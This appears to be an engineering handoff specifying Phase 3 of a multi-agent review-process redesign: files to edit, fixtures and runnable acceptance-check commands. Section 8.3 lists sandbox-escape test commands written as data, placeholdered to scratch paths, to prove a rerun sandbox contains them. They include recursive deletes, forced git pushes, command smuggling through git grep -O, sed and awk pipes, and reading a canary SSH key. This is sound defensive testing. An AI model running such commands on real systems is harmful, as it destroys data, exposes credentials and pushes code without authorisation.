- Phase 1 C-1: Cora Triage "at most 4 questions per block". C-2: `requirement-clarification.md` §3 "A block she can look up (a file, a line, current behaviour) she reads it before asking; the view-first rule is for judgment questions." C-3: Cora Triage body gains "Unsure whether he is discussing or asking for work: she asks which, as a choice question, before any clarification or work." C-5: §3 "A handed-back question is logged in the Q→A log as `→ handed back; logged as her recommendation: <it>`"; Socratic Gate 1 labels gone (AC1). C-4 (product-expert): human decision, not touched.
- Phase 2 P1-1/P1-2/P1-3/P1-8: §4.2.3, §4.2.5–4.2.7. P1-4: conductor step_Y6 4 and Blake Layer 2 on_failure: "a consistency file whose `risk_triggers:` header adds security, data or money not in the handoff's list → the domain lens runs in the next round, even with no P0". P1-5: Blake completion_protocol: the completion report is written before the Layer 2 dispatch (after step3c), `gate3_verdict` empty until the run reviewer sets it; step order and the TIMING CONTRACT text say so. P1-7: contract §7 "Cora's simple tier is stricter: a P0 after its one rework retriages it as a handoff (cora/SKILL.md Triage)". P1-9: applied in this handoff's ACs (baseline `B`). P1-6: Stays (K33).

### 4.4–4.5 Data / API / UI
No UI in this change. Gate 4 text governs UI acceptance (browser), but nothing here renders.

---

## 5. 强制问题回答
- MQ1 历史搜索: Phase 2 handoff format reused; `verify-ac-commands.sh` (linter) checked and not reused for execution (it never runs commands, exit always 0); `layer2-audit.sh`/`audit-yolo.sh` extended, not replaced.
- MQ2 函数: scripts used by ACs exist today — `skill-body-verify.sh` (exit 0), `layer2-audit.sh`, `audit-yolo.sh`, `ruby`, `perl`, `shellcheck` (present). New: `gate1-format-check.sh`, `gate3-check.sh`.
- MQ3–MQ5: N/A (no data flow or UI state).

---

## 6. Implementation Steps

| # | File(s) | Operation | Verification |
|---|---|---|---|
| 1 | read `shell-portability.md` | — | checklist |
| 2 | canonical checklist (first), gate SKILL, config-quality | MODIFY §4.2.1–4.2.3 | AC1, AC3, AC4, AC7 |
| 3 | `gate1-format-check.sh`, `gate3-check.sh` | CREATE §4.2.1–4.2.2 (re-plan: `rerun` = sandboxed disposable copy; remove the DENY regex and the awk GUARD) | AC2, AC3, AC6, AC13 |
| 4 | fixtures under `$EV/phase3-fixtures/` (§8.3), incl. `gate3-threat-handoff.md` and `gate3-sandbox-proof.sh` | CREATE (evidence, gitignored); the two re-plan files force-added (`git add -f`) like Rework 1's proof files | AC2, AC3, AC13 |
| 5 | review-contract, conductor-protocol, cora SKILL, requirement-clarification, dispatch-mode | MODIFY | AC3–AC5, AC8, AC11, AC12 |
| 6 | Alex SKILL, acceptance, express, bug, learn, experiment-path, handoff-creation, distillation | MODIFY | AC1, AC4, AC5, AC7, AC11 |
| 7 | Blake SKILL | MODIFY (K20, P1-4, P1-5) | AC3, AC6, AC11 |
| 8 | pre-gate-check, pre-accept-check (message), layer2-audit, audit-yolo, post-write-sync | MODIFY §4.2.6 | AC6, AC7 |
| 9 | templates (handoff, completion, epic, deliverable-handoff, escape-log new), live escape log, configs, docs | §4.2.4, §4.2.7 | AC5, AC7, AC12 |
| 10 | walks G1–G11 | completion report | AC10 |

Commit: local only, explicit pathspecs (`git add -- <paths>`, `git commit -- <paths>`), tag `[YOLO Phase 3]`; then regenerate the provenance ledger (`bash .tad/scripts/gen-claude-provenance.sh`) in a separate commit as Phase 2 did; never `-A`; no push.
Completion report: `.tad/evidence/yolo/review-redesign/phase3-completion.md` with Blake's `dispatch_id`, every R output, the `### Real paths` section, AR-002 [A092] contract list (gate SKILL, Blake SKILL, Cora SKILL, Alex SKILL, config edits > 20 lines), and the walks.

---

## 7. File Structure

### 7.1 Files to Create
```
.tad/hooks/lib/gate1-format-check.sh     # Gate 1 format smoke alarm (CLI, never a hook)
.tad/hooks/lib/gate3-check.sh            # Gate 3 AC re-run + real_path coverage (CLI, never a hook)
.tad/templates/escape-log.md             # escape-log header, line format, column-4 rule table
.tad/evidence/escape-log.md              # live log from the template (gitignored)
.tad/evidence/yolo/review-redesign/phase3-fixtures/{gate1-good.md, HANDOFF-fx-epic.md, HANDOFF-fx-direct.md, HANDOFF-fx-bug.md, journal-fx.md, gate3-handoff.md, gate3-verdict-missing.md, gate3-verdict-full.md, gate3-verdict-blocked.md, gate3-threat-handoff.md, gate3-sandbox-proof.sh}   # the last two tracked (git add -f); re-plan p3-y6-replan-1
```

### 7.2 Files to Modify
```
.tad/gates/gate-canonical-checklist.md          .agents/skills/gate/SKILL.md
.agents/skills/alex/SKILL.md                    .agents/skills/alex/references/acceptance-protocol.md
.agents/skills/alex/references/express-path-protocol.md   .agents/skills/alex/references/bug-path-protocol.md
.agents/skills/alex/references/learn-path-protocol.md     .agents/skills/alex/references/conductor-dispatch-mode.md
.agents/skills/alex/references/experiment-path-protocol.md
.agents/skills/alex/references/handoff-creation-protocol.md   .agents/skills/alex/references/distillation-loop-protocol.md
.agents/skills/blake/SKILL.md                   .agents/skills/cora/SKILL.md
.agents/skills/cora/references/conductor-protocol.md      .agents/skills/cora/references/requirement-clarification.md
.agents/skills/tad/SKILL.md                     .tad/templates/review-contract.md
.tad/templates/handoff-a-to-b.md                .tad/templates/completion-report.md
.tad/templates/epic-template.md                 .tad/templates/output-formats/spec-compliance-format.md
.tad/templates/deliverable-handoff.md (:243 only)
.tad/config-quality.yaml  .tad/config-execution.yaml  .tad/config-agents.yaml
.tad/hooks/pre-gate-check.sh  .tad/hooks/pre-accept-check.sh (:50 message)  .tad/hooks/lib/layer2-audit.sh  .tad/hooks/lib/audit-yolo.sh  .tad/hooks/post-write-sync.sh
.tad/gates/gate-execution-guide.md (banner only)
AGENTS.md  README.md  docs/CODEX-USER-GUIDE.md  docs/RALPH-LOOP.md  docs/process-tax-cut.md
.tad/project-knowledge/patterns/process-tax-cut.md (line 8 wording; Epic-authorised)
```
`.claude/skills/*` are links to `.agents/skills/*`: no second copies. Not touched: `docs/MULTI-PLATFORM.md` (no gate wording; Syncthing `MM`), `.tad/gates/quality-gate-checklist.md` (SUPERSEDED), Lite skills, `principles.md`, `verify-ac-commands.sh`, `deliverable-completion.md` and `completion-report.md:20` (K37).

### 7.3 Grounded Against (Alex step1c, read 2026-10-19 19:00–19:46)
Read (head 50 or the named ranges): gate-canonical-checklist.md (80, whole); gate/SKILL.md (1002; :1–420, :577–845); conductor-protocol.md (324; :1–66, :190–324); cora/SKILL.md (167; :14–110); acceptance-protocol.md (408, whole); alex/SKILL.md (1667; :55–65, :1140–1200, :1290–1350, :1535–1667); blake/SKILL.md (2053; grep map, :918–1000, :1505–1580); express-path-protocol.md (:30–60); bug-path-protocol.md (:1–90); learn-path-protocol.md (:98–106); distillation-loop-protocol.md (:1–30, :95–107); requirement-clarification.md (61, whole); conductor-dispatch-mode.md (30, whole); handoff-creation-protocol.md (:1–330, :459–520); review-contract.md (89, whole); handoff-a-to-b.md (711; :1–75, :495–711); completion-report.md (:1–48, :247–330); epic-template.md (:1–120); pre-gate-check.sh (270; :1–100, :200–270); pre-accept-check.sh (56, whole); layer2-audit.sh (306; :1–306); verify-ac-commands.sh (:1–40); audit-yolo.sh (:1–30, :105–150, :185–330); post-write-sync.sh (:135–170); config-quality.yaml (:55–100, :205–320, :690–777); config-execution.yaml (:10–25); config-agents.yaml (:225–310); quality-gate-checklist.md (:1–40, :150–180); gate-execution-guide.md (:1–12); human-rulings.md (whole); README/AGENTS/tad SKILL/CODEX guide/RALPH-LOOP (grep hits); principles.md (headings + Four-Gate, Mechanical Enforcement); patterns/_index.md. New: the two scripts, escape-log template (new — will be created).
LSP: N/A (markdown/yaml/bash). Pack check: `web-testing` and `agent-computer-interface` match (browser-driven acceptance), `code-security` matches (command execution) — pointers only, not loaded (AGENTS.md: keyword match never loads); no pack criteria injected.

---

## 8. Testing Requirements
Protocol text plus two small scripts: no unit-test suite, no model runs. Verification = §9.1 commands, fixtures, real paths RP1–RP5, walks G1–G11.

### 8.3 Edge Cases and fixtures (Blake writes the fixtures)
- `gate1-good.md`: an Epic made from the new template with every placeholder filled (dummy values), including `- **Done check**:`, `- **Not wanted**:`, `What the human gets:`, `Not wanted:`, `Premise:`, `### Decisions for the human (settled before "continue")`, `**Budget**: estimate 9 dispatches`, `**Depth**: … blast radius: …` (each at line start; Result contract lines plain, `Premise:` at line start). R2a damages copies of it with sed; each must flip the exit to 1 and print the named `MISSING <id> ` line (copy 1 → c0a, 2 → c4, 3 → c2, 4 → c1b, 5 → c3a, 6 → c3b).
- `HANDOFF-fx-epic.md`: a header with `**Epic:** EPIC-20261019-review-redesign.md (Phase 1/1)` → `OK g0 …`, exit 0. `HANDOFF-fx-direct.md`: no `**Epic:**`, no `## Bug Description`; `### 1.5 Requirement (human's words)` with `- **Result**: …`, `- **Done check**: …`, `- **Not wanted**: …`, `#### Q→A log` + one line, `#### Assumptions (not asked; Gate 4 lists them)` + one line, then `---` → exit 0 (R2d deletes its Done check line → exit 1, `MISSING c2 `). `HANDOFF-fx-bug.md`: `## Bug Description` with one line, a `## 9.1` region with one `| AC1 | … |` row → exit 0. `journal-fx.md`: one line `request: "x" | blocks: Result; Done check; Not wanted | qa: none | assumptions: none | risk_triggers: [none]` → exit 0 (journal mode: neither HANDOFF-* nor `**Epic ID**`).
- `gate3-handoff.md`: frontmatter `real_paths` RP1, RP2; a `## 9.1` region whose table header has a `Verification Method` cell; rows `| AC1 | … | \`echo ok\` | …`, `| AC2 | … | R2 | …`, `| AC3 | … | \`touch ./phase3-sbx-canary-zz\` | …` (re-plan: a write that must land in the box only — after the rerun no `phase3-sbx-canary-zz` exists in the directory R3b ran from); inside the same region, before the next `## `, a fenced block with `ENV: X=a` and `R2: printf '%s|b\n' "$X" | command grep -q 'a|b'` (a literal pipe in the command; exits 0). Expected `rerun` rows with a working sandbox: `| AC1 | 0 |`, `| AC2/R2 | 0 |`, `| AC3 | 0 |` (rows=3, notrun=0, ok=3, leak=0), and the AC2/R2 command cell shows `\|`; with no sandbox or a failed probe: three `not-run` rows (rows=3, notrun=3, ok=0, leak=0).
- **Threat fixtures (re-plan p3-y6-replan-1; force-added)**: `gate3-threat-handoff.md` — a handoff whose `## 9.1` table has one row per threat, written with placeholders `@REAL@` (a scratch "real" git repo with one commit), `@REMOTE@` (a scratch bare remote it tracks), `@VICTIM@` (a scratch dir with files), `@CANARY@` (an empty scratch dir), `@FAKEHOME@` (a scratch HOME holding `.ssh/id_gate3_canary` with a unique secret string). Rows: (a) run round 1: `git  push origin main`, `git -C . push origin main`, `rm -fr @VICTIM@`, `git tag -a v1 -m x`, `npm  publish --dry-run`; (b) cr round 2: `sed -ie s/a/PWNED/ <tracked file>`, `T=$(mktemp -d); mkdir -p "$T/.tad"; echo "touch @REAL@/cdpwn; git -C @REAL@ push @REMOTE@ main" > "$T/.tad/x.sh"; cd "$T"; bash .tad/x.sh`, `awk 'BEGIN{c="touch @CANARY@/awk1"; print 1 | c}'`, `sed 's|a|b|e' <file>`, `git grep -Otouch\ @CANARY@/pg -e a`; (c) run round 2: `find @VICTIM@ -dele{te,te}`, `git diff --out{put,}=@CANARY@/c5 HEAD`, `git grep -O'touch @CANARY@/c2; echo' -e a`, `git grep --open-files-in-p='touch @CANARY@/c4b;' -e a`, `sed -I '' s/keep/GONE/ @VICTIM@/f.txt`, `sed -n 'w@CANARY@/c9' README.md`, `awk 'BEGIN{c="touch @CANARY@/c10"; print "x" | c}'`, `sort --outp=@CANARY@/c15 README.md`; (d) every line of the tracked `gate3-deny-commands.txt` (Blake's 162, with its scratch paths mapped to the placeholders); (e) classes only an environment can stop: `echo x > @REAL@/abs-write`, `ln -s @REAL@ out; echo x > out/sym-write`, `git push @REMOTE@ HEAD:refs/heads/pwn` (remote by absolute path), `git push --force @REMOTE@ HEAD:main`, `curl -sS -m 5 https://example.com`, `git push https://example.invalid/x.git HEAD`, `cat @FAKEHOME@/.ssh/id_gate3_canary`, `security find-generic-password -s gate3-proof-nonexistent` (macOS), `open -g https://example.invalid` (macOS), `git config core.fsmonitor 'touch @CANARY@/fsm'; git status`, `cp -R . @CANARY@/copy`. No row may name a real path, the real HOME or a real remote; network rows name only `example.com` (GET) and `example.invalid`.
- `gate3-sandbox-proof.sh` (force-added): makes one scratch root (`mktemp -d`), builds `@REAL@` (git init, one commit with `README.md`, `f.txt`), `@REMOTE@` (bare, pushed once), `@VICTIM@`, `@CANARY@`, `@FAKEHOME@`; substitutes the placeholders into a scratch copy of the threat handoff and **exits 2 before running anything if any substituted path is not under its scratch root**; records the before state (real repo `git status --porcelain` + `git rev-parse HEAD^{tree}` + `git tag`, remote `git for-each-ref`, `find` listings with sizes of victim, canary and fake HOME); runs the real `.tad/hooks/lib/gate3-check.sh rerun` from `@REAL@` with `HOME=@FAKEHOME@` and `--out` into the scratch root; then prints exactly: `sandbox: <tool>`, `threat rows: <n> ran, <m> not-run` (pass needs m=0 and n = number of rows), `outside effects: 0 <list of what changed, empty>` (any difference in the before/after state or any new file under the scratch root other than `--out`), `secret in out file: <count of the canary secret string in --out>`, `box removed: <yes|no>` (the box path printed in the out header no longer exists), `control: <k>/<k> filesystem rows had an effect without the sandbox` (the same filesystem-only rows from (a)–(c) and (e) — never a network, keychain or `open` row — run with plain `bash -c` against a fresh second scratch setup, proving the rows are live), then `PROOF PASS` or `PROOF FAIL: <first reason>`; with no sandbox tool it prints `PROOF NOT-RUN: no sandbox on <uname -s>`. It removes its scratch root at the end.
- `gate3-verdict-missing.md`: valid run header, `## Real paths` with an RP1 row only (`| RP1 | echo ok | r.md | ok |`). `gate3-verdict-full.md`: that RP1 row + `## Not run` with `- RP2 not-run: needs a real device`. `gate3-verdict-blocked.md`: that RP1 row + `## Blocked` with `- RP2 blocked: tool missing, install asked` → `BLOCKED RP2`, exit 0.
- `grep` aliasing: run with `bash -c` and `command grep`. CJK and `→` in patterns: `grep -F`. A command cell containing `|` in the ac-rerun table: escaped `\|`.
- A handoff without §9.1 → `rerun` prints the header and zero rows (exit 0); without `real_paths` → `paths` exit 1 `MISSING real_paths`.

## 8.4 Friction Preflight
| Friction Point | Required Step | Expected Fix Path | Allowed Substitute | Gate Impact |
|---|---|---|---|---|
| perl absent (timeout) | gate3-check rerun | run without timeout, note it in the output header | none needed | none |
| no `sandbox-exec`/`bwrap`, or the start-up probe fails (e.g. a harness that already sandboxes refuses a nested sandbox; Linux without user namespaces) | gate3-check rerun | every row `not-run: …` — the run reviewer runs the rows by hand in a scratch copy (pre-Phase-3 practice, no wider trust); installing bwrap is a dependency the human is asked about | none (never a fallback that executes outside a sandbox) | rows recorded not-run; RP6 not-run with the host named |
| ruby absent | R9d YAML parse | ask; no silent install | `python3 -c 'import yaml'` if present | BLOCKED |
| shellcheck absent | R6b `sc=` | ask | `bash -n` only, recorded | DEGRADED_WITH_APPROVAL |
| stale git index / Syncthing MM | commit | explicit pathspecs | none | wrong commit content = Gate 3 FAIL |

## 8.5 Feedback Collection
N/A.

---

## 9. Acceptance Criteria
All §9.1 rows pass; RP1–RP5 run or are recorded `not-run` with reason; walks reach their stated ends; no weakening (AC9).

## 9.1 Spec Compliance Checklist
Run every command with `bash -c '<ENV line>; <command>'` from the repo root (or `gate3-check.sh rerun` once it exists — this table follows its conventions). In table cells `\|` stands for `|`; the raw block below is the runnable form. `B=0cf8cfda` is the baseline (the commit before Phase 3; never `HEAD:`).

| # | Acceptance Criterion | Verification Type | Verification Method | Expected Evidence | Verified Output (Alex step1d, 19:46) |
|---|---|---|---|---|---|
| AC1 | Gate 1: no Socratic labels; canonical, gate SKILL and Alex `gate1` carry the four conditions, the checker and "can design from it" | post-impl | R1a, R1b | R1a `0`; R1b `CK=0 GS=0 AS=0` | R1a `7`; R1b `CK=9 GS=9 AS=9` |
| AC2 | Format script: parses; good fixture exit 0; six damaged copies exit 1 each with its named MISSING id (incl. G6 missing Budget = c4); this Epic flags exactly its 3 gaps; handoff (Epic pointer, direct §1.5, bug) and journal modes; never registered as a hook | post-impl | R2a, R2b, R2c, R2d | R2a `0 0 1/1 1/1 1/1 1/1 1/1 1/1`; R2b `exit=1 missing=3`; R2c `0` (guard); R2d `0/1 0 1/1 0 0` | R2a `127 127 127/0 127/0 127/0 127/0 127/0 127/0`; R2b `exit=127 missing=0`; R2c `0` (guard: passes at baseline by design); R2d `127/0 127 127/0 127 127` |
| AC3 | Gate 3: `gate3-check.sh` named in gate SKILL, canonical, conductor protocol, contract, Blake; fixture with an uncovered real_path → exit 1 `MISSING RP2`; full → 0; blocked → 0 with `BLOCKED RP2`; rerun records 3 rows (`AC1`, `AC2/R2`, `AC3`), all run in the box (exit 0), the AC3 write does not leak (re-plan p3-y6-replan-1) | post-impl | R3a, R3b | R3a `0`; R3b `0 1 1 0 0 1 0 dispatch_id: fx-1 rows=3 notrun=0 ok=3 leak=0` (host with a working sandbox; with none: `… rows=3 notrun=3 ok=0 leak=0`, recorded not-run for the ok part) | R3a `5`; R3b `127 127 0 127 127 0 127  rows=0 notrun=0 ok=0 leak=0` (derived at `B`: script and fixtures absent; not re-run in the re-plan) |
| AC4 | Gate 4: gate SKILL Gate 4, step_Y7, acceptance-protocol, dispatch mode carry every acceptor duty token; security-auditor/performance-optimizer lines in gate SKILL only trigger-conditional; release ruling cited in gate SKILL and step_Y7 | post-impl | R4a, R4b, R4c | R4a `GS=0 CP=0 AP=0 DM=0`; R4b `0`; R4c each ≥`1` | R4a `GS=12 CP=11 AP=12 DM=11`; R4b `14`; R4c `0 0` |
| AC5 | Escape log: template + live file with the exact header; Cora's write list; distillation reads it (protocol + conductor 3b); `*bug` writes it | post-impl | R5 | `1 1 1 ≥1 ≥1 ≥1` | `  0 0 0 0` (files absent) |
| AC6 | Layer 2 / scripts: no old Blake rule; Check 11 reworded; all seven scripts parse, shellcheck errors 0; hook exit-2 counts = baseline; layer2-audit exits {0,1,2}; lens fixtures PASS / one lens WARN; audit-yolo knows lens names and keeps legacy | post-impl | R6a, R6b, R6c, R6e, R6f | R6a `0 0`; R6b `0 0 0 0 0 0 0 sc=0`; R6c `3/3 1/1 l2=exit 0 exit 1 exit 2` (guard); R6e `1 1`; R6f each ≥`1` | R6a `0 1` (first half a guard: already 0 since Phase 2); R6b `0 0 0 0 0 127 127 sc=2`; R6c `3/3 1/1 l2=exit 0 exit 1 exit 2` (guard: passes at baseline by design); R6e `0 0`; R6f `0 0 0 5` |
| AC7 | Sweeps: intake AC3.6 grep leaves only the allow-listed hits (each agrees: unrelated pack scripts, the rubric "self-assessment" VIOLATION, a COI checklist, a doc line rejecting self-assessment, superseded/historical files); old-phrase sweep over the Phase 3 file set empty | post-impl | R7a, R7b | `0`; `0` | `4`; `49` |
| AC8 (guard) | Tags ⊇ baseline; step_Y7 keeps [A005][A007][A088][A089][A095][A037]; Knowledge-Assessment blocking lines unchanged | post-impl | R8a, R8b, R8c | `0`; `0`; `0` | `0`; `0`; `0` (guard: passes at baseline by design; not vacuous after the commit — R8a/R8c compare against `B`) |
| AC9 (guard) | No weakening: per-file tokens (stop-list words, [A060][A078][A081][A086], AR-001, Express-not-exempt, MUST/MANDATORY/VIOLATION) not lower; skill-body-verify green; registry byte-identical (non-empty); three YAMLs parse | post-impl | R9a, R9b, R9c, R9d | `0`; `exit=0`; `0 64`; `OK OK OK` | `0`; `exit=0`; `0 64`; `OK OK OK` (guard: passes at baseline by design; R9a/R9c compare against `B`) |
| AC10 | Walks G1–G11 in the completion report, quoting deciding lines | post-impl | R10 | `11` | file absent |
| AC11 | Carried conditions (C-1, C-3, C-2, C-5, bug escalation, learn-path, contract §7 simple tier, P1-4 in protocol and Blake, P1-5) | post-impl | R11 | `≥1 ≥1 ≥1 ≥1 0 ≥1 0 ≥1 ≥1 ≥1 ≥1` | `0 0 0 0 1 0 1 0 0 0 0` |
| AC12 | Epic template carries the Gate 1 items; Cora Intake runs the format script; requirement-clarification, the handoff template §1.5 and Cora's journal fields name the Done check / Not wanted lines | post-impl | R12 | `0 ≥1 ≥1 ≥1 ≥1 ≥1` | `7 0 0 0 0 0` |
| AC13 | `rerun` containment (re-plan p3-y6-replan-1): every threat row of both review rounds, Blake's 162 deny rows and the environment-only classes runs inside the sandboxed box with no effect outside it, no canary secret in the output, box removed; the same filesystem rows are live without the sandbox (control); no deny list or allowlist guard left in the script | post-impl | R13a, R13b | R13a `5`; R13b `0` (host with `sandbox-exec` or `bwrap`; with neither, R13a prints `PROOF NOT-RUN` and the run reviewer records RP6 not-run with the host) | R13a not dry-run (proof script does not exist yet: `0`); R13b dry-run by the re-plan: `2` at 23ed6706 (allowlist), `1` at fe797468 (deny regex) — both fail for the right reason |

Raw commands:
```
ENV: B=0cf8cfda GS=.agents/skills/gate/SKILL.md CK=.tad/gates/gate-canonical-checklist.md AS=.agents/skills/alex/SKILL.md AP=.agents/skills/alex/references/acceptance-protocol.md DM=.agents/skills/alex/references/conductor-dispatch-mode.md CS=.agents/skills/cora/SKILL.md CP=.agents/skills/cora/references/conductor-protocol.md RQ=.agents/skills/cora/references/requirement-clarification.md RC=.tad/templates/review-contract.md BS=.agents/skills/blake/SKILL.md G1S=.tad/hooks/lib/gate1-format-check.sh G3S=.tad/hooks/lib/gate3-check.sh EV=.tad/evidence/yolo/review-redesign FX=.tad/evidence/yolo/review-redesign/phase3-fixtures
R1a: command grep -n 'Socratic' $GS $CK | wc -l
R1b: for f in CK GS AS; do case $f in CK) blk=$(awk '/^## Gate 1/,/^## Gate 2/' $CK);; GS) blk=$(awk '/^## Gate 1/,/^## Gate 2/' $GS);; AS) blk=$(awk '/^  gate1:/,/^  gate2:/' $AS);; esac; m=0; for t in 'What the human gets' 'Not wanted' 'Done check' 'Decisions for the human' 'Premise' 'blast radius' 'Budget' 'can design from it' 'gate1-format-check.sh'; do printf '%s\n' "$blk" | command grep -qF -- "$t" || m=$((m+1)); done; printf '%s=%s ' $f $m; done; echo
R2a: G=$FX/gate1-good.md; T=$(mktemp -d); bash -n $G1S; n=$?; bash $G1S $G >/dev/null; a=$?; sed '/^## Requirement/,/^## Result contract/{/^## Result contract/!d;}' $G > $T/1.md; sed '/^\*\*Budget\*\*/d' $G > $T/2.md; sed '/Done check/d' $G > $T/3.md; sed '/Not wanted/d' $G > $T/4.md; sed '/Decisions for the human/d' $G > $T/5.md; sed '/^Premise:/d' $G > $T/6.md; r=""; i=0; for id in c0a c4 c2 c1b c3a c3b; do i=$((i+1)); bash $G1S $T/$i.md > $T/o$i.txt; e=$?; m=$(command grep -c "^MISSING $id " $T/o$i.txt); r="$r $e/$m"; done; echo "$n $a$r"
R2b: bash $G1S .tad/active/epics/EPIC-20261019-review-redesign.md > $(mktemp); e=$?; echo "exit=$e missing=$(bash $G1S .tad/active/epics/EPIC-20261019-review-redesign.md | command grep -c '^MISSING')"
R2c: command grep -rn -e gate1-format-check -e gate3-check .codex/hooks.json .cursor/hooks.json .opencode/plugins .claude/settings.local.json .tad/templates/claude/settings.json 2>/dev/null | wc -l
R2d: T=$(mktemp -d); bash $G1S $FX/HANDOFF-fx-epic.md > $T/e.txt; e=$?; eg=$(command grep -c '^OK g0 ' $T/e.txt); bash $G1S $FX/HANDOFF-fx-direct.md >/dev/null; d=$?; sed '/Done check/d' $FX/HANDOFF-fx-direct.md > $T/HANDOFF-fx-nodc.md; bash $G1S $T/HANDOFF-fx-nodc.md > $T/n.txt; x=$?; xm=$(command grep -c '^MISSING c2 ' $T/n.txt); bash $G1S $FX/HANDOFF-fx-bug.md >/dev/null; b=$?; bash $G1S $FX/journal-fx.md >/dev/null; j=$?; echo "$e/$eg $d $x/$xm $b $j"
R3a: n=0; for f in $GS $CK $CP $RC $BS; do command grep -q 'gate3-check.sh' $f || n=$((n+1)); done; echo $n
R3b: T=$(mktemp -d); bash -n $G3S; a=$?; bash $G3S paths $FX/gate3-handoff.md $FX/gate3-verdict-missing.md > $T/m.txt; b=$?; bm=$(command grep -c '^MISSING RP2' $T/m.txt); bash $G3S paths $FX/gate3-handoff.md $FX/gate3-verdict-full.md >/dev/null; c=$?; bash $G3S paths $FX/gate3-handoff.md $FX/gate3-verdict-blocked.md > $T/b.txt; e=$?; eb=$(command grep -c '^BLOCKED RP2' $T/b.txt); bash $G3S rerun $FX/gate3-handoff.md --out $T/r.md --id fx-1 >/dev/null; d=$?; touch $T/r.md; leak=$(ls -d phase3-sbx-canary-zz 2>/dev/null | wc -l | tr -d ' '); echo "$a $b $bm $c $e $eb $d $(head -1 $T/r.md) rows=$(command grep -c '^| AC' $T/r.md) notrun=$(command grep -cE '^\| AC[0-9]+(/[A-Za-z0-9]+)? \| not-run' $T/r.md) ok=$(command grep -cE '^\| AC[123](/[A-Za-z0-9]+)? \| 0 \|' $T/r.md) leak=$leak"
R4a: g4(){ case $1 in GS) awk '/^## Gate 4: /,/^## Gate 4 — Rubric/' $GS;; CP) awk '/^    step_Y7:/,/^    step_Y8:/' $CP;; AP) cat $AP;; DM) cat $DM;; esac; }; for f in GS CP AP DM; do m=0; for t in 'took no part' 'browser' 'screenshot' '## Requirement' 'Result contract' 'Assumptions' 'real device' 'payment' 'login' 'For the human' 'not-run: no browser tool' 'gate3-check.sh paths'; do g4 $f | command grep -qF -- "$t" || m=$((m+1)); done; printf '%s=%s ' $f $m; done; echo
R4b: command grep -n -e security-auditor -e performance-optimizer $GS | command grep -vc -e trigger -e domain -e 'Claude Code'
R4c: echo "$(awk '/^## Gate 4: /,/^## Gate 4 — Rubric/' $GS | command grep -c 'human-rulings.md') $(awk '/^    step_Y7:/,/^    step_Y8:/' $CP | command grep -c 'human-rulings.md')"
R5: H='| date | defect | found by | gate that should have caught it | pointer |'; echo "$(command grep -cF -- "$H" .tad/templates/escape-log.md 2>/dev/null) $(command grep -cF -- "$H" .tad/evidence/escape-log.md 2>/dev/null) $(command grep -F 'She may write only' $CS | command grep -c 'escape log') $(command grep -c 'escape-log.md' .agents/skills/alex/references/distillation-loop-protocol.md) $(awk '/^  epic_completion:/,/^  workflow_path:/' $CP | command grep -c 'escape-log.md') $(command grep -c 'escape-log.md' .agents/skills/alex/references/bug-path-protocol.md)"
R6a: echo "$(command grep -c -e 'P1=0' -e 'max 5 rounds' -e '≥2 DISTINCT' $BS) $(command grep -c 'code-reviewer + domain expert' .tad/hooks/pre-gate-check.sh)"
R6b: for s in .tad/hooks/pre-gate-check.sh .tad/hooks/pre-accept-check.sh .tad/hooks/lib/layer2-audit.sh .tad/hooks/lib/audit-yolo.sh .tad/hooks/post-write-sync.sh $G1S $G3S; do bash -n $s 2>/dev/null; printf '%s ' $?; done; echo "sc=$(shellcheck -S error $G1S $G3S 2>&1 | wc -l | tr -d ' ')"
R6c: for s in .tad/hooks/pre-gate-check.sh .tad/hooks/pre-accept-check.sh; do printf '%s ' "$(command grep -cE 'exit 2([^0-9]|$)' $s)/$(git show $B:$s | command grep -cE 'exit 2([^0-9]|$)')"; done; echo "l2=$(command grep -oE 'exit [0-9]+' .tad/hooks/lib/layer2-audit.sh | sort -u | tr '\n' ' ')"
R6e: T=$(mktemp -d); mkdir -p $T/fx-lens $T/fx-one; for f in gate3-verdict consistency-review; do head -c 400 /dev/zero | tr '\0' x > $T/fx-lens/$f.md; done; head -c 400 /dev/zero | tr '\0' x > $T/fx-one/gate3-verdict.md; p=$(LAYER2_AUDIT_REVIEW_ROOT=$T LAYER2_AUDIT_HANDOFF_ROOT=$T bash .tad/hooks/lib/layer2-audit.sh fx-lens 2>&1 | command grep -c '^Layer 2 audit PASS'); w=$(LAYER2_AUDIT_REVIEW_ROOT=$T LAYER2_AUDIT_HANDOFF_ROOT=$T bash .tad/hooks/lib/layer2-audit.sh fx-one 2>&1 | command grep -c '^WARN_REVIEWER_COUNT=1$'); echo "$p $w"
R6f: A=.tad/hooks/lib/audit-yolo.sh; echo "$(command grep -c design-review-consistency $A) $(command grep -c impl-review-consistency $A) $(command grep -c gate3-verdict $A) $(command grep -c design-review-cr $A)"
R7a: command grep -rn -e 'min 2' -e '≥2 DISTINCT' -e '≥2 distinct' -e 'at least two distinct' -e 'P1=0' -e 'max 5 rounds' -e 'max 2 rounds' -e 'self-assess' .agents/skills .tad/gates .tad/templates .tad/hooks AGENTS.md README.md docs/ .tad/project-knowledge/patterns/process-tax-cut.md | command grep -v -e '^\.agents/skills/alex-lite/' -e '^\.agents/skills/blake-lite/' -e '^\.agents/skills/synthetic-data/scripts/validate-curation-config.sh:[0-9]*:P1=0$' -e '^\.agents/skills/rag-retrieval/scripts/rag-config-lint.sh:[0-9]*:P0=0; P1=0; P2=0$' -e 'VIOLATION (artifact-channel)' -e 'COI self-assessed' -e '^docs/value-proposition.md:[0-9]*:   commands, not self-assessment' -e '^\.tad/gates/quality-gate-checklist.md:' -e '^docs/archive/' -e '^docs/legacy/' -e '^docs/releases/' -e '^docs/HISTORY.md:' -e '^docs/MIGRATION-v2.md:' | wc -l
R7b: command grep -nF -e 'Socratic Q' -e 'Optional Quick Check' -e 'Blake owns - EXPANDED' -e 'Gate 4 v2 是纯业务验收' -e 'Required Subagents (MANDATORY' -e 'code-reviewer + domain expert' -e '演示/走查' -e 'Human验证"这是我期望的"' -e 'Owner: Agent B (Blake) executes' -e 'Blake 完成集成' -e 'Integration Verification (Agent B' -e 'tier_threshold' -e 'KEEPS ≥1 expert' -e 'Layer 2 Group 0' -e 'Gate 4 通过前必须有安全和性能审查证据' -e 'security-auditor subagent was called' -e 'Gate 3 verification' -e '| Gate 3 | Blake |' -e '← Blake 负责' -e '人类确认）' -e 'business-only' -e 'business AC' -e 'Alex will raw-TSV-recompute' -e 'Gate 4 v2 acceptance (Alex side' -e 'Gate 3 v2 (Blake side' -e 'Gate 4 (business acceptance)' -e 'Blake must run *complete' $GS $CK $AS $AP .agents/skills/alex/references/express-path-protocol.md .agents/skills/alex/references/bug-path-protocol.md .agents/skills/alex/references/learn-path-protocol.md .agents/skills/alex/references/experiment-path-protocol.md $DM $BS $CS $CP 